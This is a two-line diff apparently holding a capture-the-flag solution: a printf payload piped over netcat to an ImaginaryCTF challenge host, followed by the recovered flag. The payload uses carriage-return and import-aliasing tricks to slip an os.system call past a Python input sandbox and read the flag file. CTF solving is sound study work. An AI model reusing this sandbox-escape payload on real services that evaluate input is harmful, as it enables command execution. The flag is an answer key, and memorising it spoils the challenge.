@@ -1,0 +1,2 @@
+printf 'from main import inp as b\rfrom os import system as exit\ncat if b else print\rprint if not b else flag \rfrom time import sleep as exit' | nc pycrib.chal.imaginaryctf.org 1337
+ictf{bash_python_polygl0t?_or_cheese_810a32fb}
